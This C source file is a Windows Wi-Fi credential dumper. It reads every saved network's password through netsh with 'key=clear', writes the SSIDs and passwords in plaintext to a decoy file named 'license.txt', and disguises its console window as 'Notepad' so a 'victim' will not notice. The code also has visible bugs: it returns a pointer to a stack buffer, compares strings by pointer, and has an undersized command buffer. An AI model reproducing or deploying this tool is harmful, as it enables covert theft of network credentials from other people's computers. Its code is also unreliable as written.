/**
 * @file dumper.c
 * @author Francisco Spínola (fssecur3@outlook.com)
 * @brief Dump Wifi credentials from Windows machines (needs admin privileges)
 * @version 0.3
 * @date 2021-03-10
 * @copyright Copyright (c) 2021
 * 
 * DESCRIPTION
 * Do not redistribute or use this software for malicious purposes!
 * When executed, tries to hide itself (if a GUI can be created) by resizing the window and changing the background 
 * color to white, looking similar to a notepad. The window title is also renamed to "Notepad"
 * Finally, a file named (for obfuscation) "licence.txt" is created with all the credentials stored in the system
 * 
 * COMPILING
 * $ gcc dumper.c -o dumper.exe
 * 
 * EXECUTION
 * You can execute the program on a terminal or by double clicking the executable.
 * 
 * WARNING
 * Careful when double clicking, since you will spawn a GUI and that can warn a "victim" of what's happening.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>

#define SSID 32
#define BUFFER 59
#define PWD 64

//Retrieve the Wifi passwords
char *password (char *ssid) {
    char *pwd = NULL;
    FILE *process;
    char buf[75];
    char cmd[66] = "netsh wlan show profile key=clear \"";
    strncat(cmd, ssid, SSID);
    strncat(cmd, "\"", 1);
    
    if ((process = popen(cmd, "r")) == NULL) {
        exit(0);
    }
    
    bool go = false;
    
    while (fgets(buf, 75, process) != NULL && !go) {
        
        char *token;

        token = strtok(buf, ":");
        if (strcmp(buf, "    Key Content            ") == 0) {
            go = true;
        }
        
        token = strtok(NULL, ":");
        if (go) {
            if (token != NULL) {
                pwd = token;
            }
            pwd++;
            pwd[strlen(pwd) - 1] = '\0';
        }
    }
    
    if (pclose(process)) {
        exit(0);
    }
    
    if (pwd == NULL || pwd == " " || pwd == "\n") {
        pwd = "";
    }
    
    return pwd;
}

//Saves the ssids by writing to a text file
void write(char ssids[][SSID], char passwords[][PWD], int *count) {
    FILE *f = fopen("license.txt", "w");
    if (f == NULL) {
        exit(1);
    }

    //print some text
    int i = 0;
    while (i < *count) {
        fprintf(f, "%s:%s\n", ssids[i], passwords[i]);
        ++i;
    }

    fclose(f);
}

//Retrieve the Wifi SSIDs
void ssid(int *count) {
    char ssids[PWD][SSID];
    char passwords[PWD][PWD];
    char *ssid = NULL;
    char *pwd = NULL;
    FILE *process;
    char *cmd = "netsh wlan show profile";
    char buf[BUFFER];

    if ((process = popen(cmd, "r")) == NULL) {
        exit(0);
    }

    while (fgets(buf, BUFFER, process) != NULL) {
        char *token;

        token = strtok(buf, ":");
        token = strtok(NULL, ":");
        if (strcmp(buf, "    All User Profile     ") == 0) {
            if (token != NULL) {
                ssid = token;
            }
            ssid++;
            ssid[strlen(ssid) - 1] = '\0';
            strncpy(ssids[(*count)], ssid, SSID);
            pwd = password(ssid);
            strncpy(passwords[(*count)], pwd, PWD);
            (*count)++;
        }
    }

    if (pclose(process)) {
        exit(0);
    }

    write(ssids, passwords, count);
}

//Check if user has admin rights (since we need it to use "key=clear")
bool checkAdmin () {
    FILE *process;
    char buf[100];
    if ((process = popen("net user %username%", "r")) == NULL) {
        exit(0);
    }

    while (fgets(buf, 100, process) != NULL) {
        if (strstr(buf, "*Administrators") != NULL || strstr(buf, "*Administradores") != NULL || strstr(buf, "*Administrateurs") != NULL || 
            strstr(buf, "*Administratoren") != NULL || strstr(buf, "*Beheerders") != NULL || strstr(buf, "*Amministratori") != NULL || 
            strstr(buf, "*Administratores") != NULL || strstr(buf, "*Administratorer") != NULL || strstr(buf, "*Administratorzy") != NULL) {
            return true;
        }
    }

    return false;
}

//Main
int main(int argc, char **argv) {
    system("mode con:cols=15 lines=1");
    system("color f0");
    system("title Notepad");

    if (!checkAdmin()) {
        return -1;
    }
    
    int count = 0;
    ssid(&count);
    
    return 0;
}